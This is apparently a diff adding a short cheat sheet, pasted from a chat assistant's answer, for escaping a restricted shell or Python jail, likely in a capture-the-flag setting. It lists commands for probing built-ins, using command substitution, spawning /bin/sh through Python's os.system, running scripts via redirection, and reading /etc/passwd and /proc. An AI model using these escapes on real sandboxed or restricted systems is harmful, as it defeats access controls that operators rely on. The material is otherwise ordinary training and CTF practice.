@@ -1,0 +1,87 @@
+1. Check for Available Built-ins
+Since binaries in /bin are deleted, external commands might not work. But built-in shell functions or Python built-ins could still be accessible.
+
+Try:
+
+shell
+Copy
+Edit
+> help
+> echo $0
+> type type
+> alias
+> enable
+help might list available built-ins.
+echo $0 can reveal the shell.
+type type checks if type itself is available.
+2. Exploit String Expansion
+If direct command execution is blocked, check if expansions work:
+
+shell
+Copy
+Edit
+> echo $(whoami)
+> echo $((1+1))
+If $(command) is blocked, try backticks: `whoami`.
+3. Check If Python or Perl Exists
+Try invoking an interactive Python or Perl shell:
+
+markdown
+Copy
+Edit
+> python
+> python3
+> perl
+If python is blocked, try running inline code:
+
+shell
+Copy
+Edit
+> python -c "print('hello')"
+> perl -e 'print "hello\n";'
+If Python is available, you can break out using:
+
+python
+Copy
+Edit
+import os
+os.system('/bin/sh')
+4. Use Redirection and Globbing
+Some jails block direct execution but allow redirection tricks:
+
+shell
+Copy
+Edit
+> echo "ls" > temp.sh
+> . temp.sh
+Or try globbing:
+
+shell
+Copy
+Edit
+> *  # Sometimes works in certain shells
+> ~/*  # Home directory access
+5. Use File Descriptors
+If commands are blocked, try reading system files:
+
+shell
+Copy
+Edit
+> cat /etc/passwd
+> cat /proc/self/cmdline
+6. Abuse exec or eval
+If you suspect it's a Python jail:
+
+shell
+Copy
+Edit
+> exec('ls')
+> eval('ls')
+7. Use find or /proc
+If ls is blocked, try:
+
+shell
+Copy
+Edit
+> find /
+> cat /proc/self/exe
